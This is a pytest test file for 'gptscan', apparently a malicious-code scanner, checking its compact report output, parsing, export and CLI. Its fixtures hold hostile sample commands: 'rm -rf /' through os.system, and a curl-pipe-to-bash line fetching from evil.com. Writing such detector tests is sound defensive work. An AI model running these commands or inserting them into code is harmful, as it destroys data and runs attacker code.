import os
import json
import pytest
import gptscan


def test_generate_compact_basic():
    results = [
        {
            "path": "src/app.py",
            "line": 42,
            "own_conf": "85%",
            "admin_desc": "Malicious command execution",
            "end-user_desc": "Dangerous code detected",
            "snippet": "import os; os.system('rm -rf /')"
        },
        {
            "path": "scripts/test.sh",
            "line": 10,
            "own_conf": 0.95,
            "gpt_conf": "90%",
            "admin_desc": "Suspicious curl pipe to bash\nSecond line description",
            "snippet": "curl http://evil.com/sh | bash"
        }
    ]

    compact_out = gptscan.generate_compact(results)
    lines = compact_out.splitlines()

    assert len(lines) == 2
    assert lines[0] == "src/app.py:42: [85%] Malicious command execution"
    assert lines[1] == "scripts/test.sh:10: [90%] Suspicious curl pipe to bash Second line description"


def test_generate_compact_empty():
    assert gptscan.generate_compact([]) == ""


def test_parse_compact_content_valid():
    content = """
src/app.py:42: [85%] Malicious command execution
scripts/test.sh:10: [90%] Suspicious curl pipe to bash
docs/guide.py:1: Dangerous script found
# Comment line should be ignored
"""

    parsed = gptscan.parse_compact_content(content)
    assert len(parsed) == 3

    assert parsed[0]["path"] == "src/app.py"
    assert parsed[0]["line"] == 42
    assert parsed[0]["own_conf"] == "85%"
    assert parsed[0]["admin_desc"] == "Malicious command execution"

    assert parsed[1]["path"] == "scripts/test.sh"
    assert parsed[1]["line"] == 10
    assert parsed[1]["own_conf"] == "90%"
    assert parsed[1]["admin_desc"] == "Suspicious curl pipe to bash"

    assert parsed[2]["path"] == "docs/guide.py"
    assert parsed[2]["line"] == 1
    assert parsed[2]["admin_desc"] == "Dangerous script found"


def test_parse_compact_content_empty():
    assert gptscan.parse_compact_content("") == []
    assert gptscan.parse_compact_content("\n  \n") == []


def test_export_results_to_file_compact(tmp_path):
    results = [
        {
            "path": "test.py",
            "line": 15,
            "own_conf": "75%",
            "admin_desc": "High risk pattern"
        }
    ]
    out_file = tmp_path / "report.compact"
    gptscan.export_results_to_file(str(out_file), results, output_format="compact")

    assert out_file.exists()
    content = out_file.read_text(encoding="utf-8").strip()
    assert content == "test.py:15: [75%] High risk pattern"


def test_parse_report_content_auto_detect_compact():
    content = "lib/utils.py:100: [95%] Reverse shell payload detected"
    imported = gptscan.parse_report_content(content, filename_hint="report.compact")

    assert len(imported) == 1
    assert imported[0]["path"] == "lib/utils.py"
    assert imported[0]["line"] == "100"
    assert imported[0]["own_conf"] == "95%"
    assert imported[0]["admin_desc"] == "Reverse shell payload detected"


def test_cli_compact_format(tmp_path, capsys):
    test_file = tmp_path / "vulnerable.py"
    test_file.write_text("import os\nos.system('rm -rf /')\n", encoding="utf-8")

    exit_code = gptscan.run_cli(
        targets=[str(test_file)],
        deep=False,
        show_all=True,
        use_gpt=False,
        rate_limit=60,
        output_format="compact",
        quiet=True
    )

    captured = capsys.readouterr()
    assert exit_code >= 0
    assert str(test_file) in captured.out
    assert ":" in captured.out
